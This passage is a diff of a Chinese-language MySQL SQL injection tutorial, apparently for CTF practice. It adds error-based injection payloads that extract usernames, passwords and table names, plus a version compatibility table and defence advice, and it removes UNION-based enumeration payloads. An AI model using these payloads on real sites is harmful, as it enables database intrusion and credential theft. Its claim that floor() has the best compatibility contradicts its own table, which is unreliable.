+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="o">#</span><span class="w"> </span><span class="err">获取第二行数据</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>使用 concat_ws() 函数处理长数据</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="o">#</span><span class="w"> </span><span class="err">使用分隔符连接数据，便于分段获取</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">concat_ws</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>使用 hex() 函数处理二进制数据</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="o">#</span><span class="w"> </span><span class="err">将二进制数据转换为十六进制，避免特殊字符问题</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">hex</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>使用 group_concat() 配合 substr()</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="o">#</span><span class="w"> </span><span class="err">获取所有表名，每</span><span class="mi">32</span><span class="err">个字符一段</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>使用 case when 条件判断</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="o">#</span><span class="w"> </span><span class="err">通过条件判断逐个字符获取</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">&#39;b&#39;</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>使用 if() 函数配合 substr()</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="o">#</span><span class="w"> </span><span class="err">判断特定位置的字符</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;yes&#39;</span><span class="p">,</span><span class="s1">&#39;no&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+</code></pre></div></p>
 </li>
 </ol>
-<hr />
-<h3 id="information_schema">二、<code>information_schema</code> 数据库<a class="headerlink" href="#information_schema" title="Permanent link">&para;</a></h3>
-<p><code>information_schema</code> 是 MySQL 的元数据表，主要包含以下常用的系统表：</p>
+<p>使用 substr() 函数分段获取</p>
+<blockquote>
+<p>使用 mid() 函数分段获取</p>
+<p>使用 limit 分页获取</p>
+<p>使用 concat_ws() 函数处理长数据</p>
+<p>使用 hex() 函数处理二进制数据</p>
+<p>使用 group_concat() 配合 substr()</p>
+<p>使用 case when 条件判断</p>
+<p>使用 if() 函数配合 substr()</p>
+</blockquote>
+<p>这些方法各有特点：</p>
+<blockquote>
+<p>前两种方法适合获取连续的长文本</p>
+<p>第三种方法适合获取多行数据</p>
+<p>第四种方法适合处理结构化数据</p>
+<p>第五种方法适合处理二进制数据</p>
+<p>最后三种方法适合精确获取特定字符</p>
+</blockquote>
+<h3 id="3-updatexml">3. 基于 updatexml() 的报错注入<a class="headerlink" href="#3-updatexml" title="Permanent link">&para;</a></h3>
+<p><code>updatexml()</code> 也是 MySQL 的 XML 处理函数，用于更新 XML 文档。当 XML 格式不正确时，同样会返回错误信息。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+<blockquote>
+<p>构造简单</p>
+<p>返回数据长度有限制（最多32个字符）</p>
+<p>适用于 MySQL 5.1.5 及以上版本</p>
+</blockquote>
+<h2 id="_3">其他报错注入方法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>除了上述三种主要方法外，还有其他一些报错注入方法：</p>
+<ol>
+<li>基于 exp() 的报错注入</li>
+<li>基于 bigint 溢出的报错注入</li>
+<li>基于 geometrycollection() 的报错注入</li>
+<li>基于 multipoint() 的报错注入</li>
+<li>基于 polygon() 的报错注入</li>
+<li>基于 multipolygon() 的报错注入</li>
+<li>基于 linestring() 的报错注入</li>
+<li>基于 multilinestring() 的报错注入</li>
+<li>基于 name_const() 的报错注入</li>
+</ol>
+<h2 id="mysql">MySQL 版本兼容性对比<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
-<th>系统表</th>
-<th>描述</th>
+<th>报错注入方法</th>
+<th>MySQL 5.0</th>
+<th>MySQL 5.1</th>
+<th>MySQL 5.5</th>
+<th>MySQL 5.6</th>
+<th>MySQL 5.7</th>
+<th>MySQL 8.0</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>TABLES</code></td>
-<td>存储所有数据库中表的信息，如表名、表类型等。</td>
+<td>floor()</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✗</td>
 </tr>
 <tr>
-<td><code>COLUMNS</code></td>
-<td>存储所有数据库中列的信息，如列名、数据类型等。</td>
+<td>extractvalue()</td>
+<td>✗</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
 </tr>
 <tr>
-<td><code>SCHEMATA</code></td>
-<td>存储所有数据库的名称。</td>
+<td>updatexml()</td>
+<td>✗</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
 </tr>
 <tr>
-<td><code>KEY_COLUMN_USAGE</code></td>
-<td>存储主键、外键等约束信息。</td>
+<td>exp()</td>
+<td>✗</td>
+<td>✗</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
 </tr>
 <tr>
-<td><code>USER_PRIVILEGES</code></td>
-<td>存储用户权限信息。</td>
+<td>bigint</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
 </tr>
 <tr>
-<td><code>CHARACTER_SETS</code></td>
-<td>存储 MySQL 支持的字符集信息。</td>
+<td>geometry</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
 </tr>
 <tr>
-<td><code>COLLATIONS</code></td>
-<td>存储排序规则相关信息。</td>
+<td>name_const</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✗</td>
 </tr>
 </tbody>
 </table>
-<hr />
-<h3 id="sql">三、常见的 SQL 注入信息枚举过程<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
-<p>通过 <strong>SQL 注入</strong> 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：</p>
-<p><strong>获取数据库名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">#</span><span class="err">获取当前</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="err">实例中所有数据库的名称。</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
-</code></pre></div>
-<p><strong>获取表名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">#</span><span class="err">查询某个数据库</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">table_schema</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="err">中的所有表名。</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;目标数据库&#39;</span><span class="p">;</span>
-</code></pre></div>
-<p><strong>获取列名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="o">#</span><span class="err">查询某个表中的所有列名。</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;目标表&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;目标数据库&#39;</span><span class="p">;</span>
-</code></pre></div>
-<p><strong>获取表的数据</strong> 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT login_name, login_passwd FROM lesson_user;
-</code></pre></div>
-<hr />
-<h3 id="information_schema-sql">四、基于 <code>information_schema</code> 的 SQL 注入示例<a class="headerlink" href="#information_schema-sql" title="Permanent link">&para;</a></h3>
-<p>假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。</p>
-<p>假设网站存在以下查询：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;;
-</code></pre></div>
-<p>攻击者可以通过修改输入来进行 SQL 注入。</p>
-<p>注入步骤</p>
-<p><strong>获取数据库名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>#通过 `UNION SELECT` 合并查询，列出所有数据库名称。
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&#39; OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
-</code></pre></div>
-<p><strong>获取表名</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="w"> </span><span class="o">#</span><span class="err">查询特定数据库中的所有表。</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="s1">&#39; OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=&#39;</span><span class="err">目标数据库&#39;</span>
-</code></pre></div>
-<p><strong>获取列名</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="o">#</span><span class="err">查询特定表中的所有列名。</span>
-<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="s1">&#39; OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#39;</span><span class="n">users</span><span class="err">&#39;</span><span class="w"> </span><span class="o">#</span>
-</code></pre></div>
-<p><strong>获取敏感数据</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="o">#</span><span class="err">获取</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="err">表中的用户名和密码。</span>
-<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">#</span>
-</code></pre></div>
-<hr />
-<h3 id="mysql-mysqluser">五、MySQL 用户账户表 (<code>mysql.user</code>)<a class="headerlink" href="#mysql-mysqluser" title="Permanent link">&para;</a></h3>
-<p><code>mysql.user</code> 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。</p>
-<table>
-<thead>
-<tr>
-<th>列名</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Host</code></td>
-<td>用户允许登录的主机。</td>
-</tr>
-<tr>
-<td><code>User</code></td>
-<td>用户名。</td>
-</tr>
-<tr>
-<td><code>Password</code></td>
-<td>用户密码（MySQL 8.0 之前存储为 <code>authentication_string</code>）。</td>
-</tr>
-<tr>
-<td><code>Select_priv</code></td>
-<td>是否有 <code>SELECT</code> 权限。</td>
-</tr>
-<tr>
-<td><code>Insert_priv</code></td>
-<td>是否有 <code>INSERT</code> 权限。</td>
-</tr>
-<tr>
-<td>...</td>
-<td>其他权限字段，如 <code>UPDATE</code>, <code>DELETE</code> 等。</td>
-</tr>
-</tbody>
-</table>
-<p>通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="o">#</span><span class="err">列出</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="err">用户</span>
-<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span>
-</code></pre></div>
+<h2 id="_4">使用建议<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<ol>
+<li>优先使用 floor() 方法，因为它的兼容性最好</li>
+<li>如果 floor() 方法失败，可以尝试 extractvalue() 或 updatexml()</li>
+<li>注意不同版本 MySQL 对某些方法的限制</li>
+<li>在实际测试中，建议先确定数据库版本，再选择合适的报错注入方法</li>
+</ol>
+<h2 id="_5">防御建议<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<ol>
+<li>关闭错误信息显示</li>
+<li>使用参数化查询</li>
+<li>对用户输入进行严格的过滤和验证</li>
+<li>使用最小权限原则</li>
+<li>定期更新数据库版本 </li>
+</ol>
 
 
 
